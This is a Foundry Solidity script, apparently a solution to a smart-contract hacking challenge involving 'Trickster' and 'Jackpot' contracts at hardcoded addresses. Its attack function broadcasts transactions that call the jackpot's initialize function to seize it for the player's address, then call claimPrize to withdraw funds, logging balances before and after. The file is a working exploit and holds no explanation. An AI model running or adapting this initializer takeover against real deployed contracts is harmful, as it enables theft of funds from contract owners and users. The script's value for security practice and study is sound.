// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
interface IJackpot {
    fallback() external payable;

    function claimPrize(uint256 amount) external payable;

    function initialize(address _jackpotProxy) external payable;

    receive() external payable;
}
interface ITrickster {
    function balance() external view returns (uint256);

    function claimPrize() external payable;

    function initialize(address _jackpot) external;

    receive() external payable;
}

contract TricksterScript is Script {
    ITrickster trickster;
    IJackpot jackpot;

    address player = 0xae22f26D5ddfE22d24aA28AEB1D44c962c673438;
    function setUp() public {
        trickster = ITrickster(payable(0x81642A73561E34fa7708CCD733d44D011a81dFce));
        jackpot = IJackpot(payable(0x5117DF9e02134d103FAdD95A16Cc2a9392107908));
    }
    function run() public {
        attack();
    }
    function attack() public {
        vm.startBroadcast(player);
        // vm.startPrank(player, player);
        jackpot.initialize(player);
        uint valueToSend = trickster.balance() / 2;
        console.log("T Balance :", address(trickster).balance);
        console.log("J Balance :", address(jackpot).balance);
        // trickster.claimPrize{value: valueToSend}();
        jackpot.claimPrize(valueToSend);
        console.log("T Balance :", address(trickster).balance);
        console.log("J Balance :", address(jackpot).balance);
    }
}
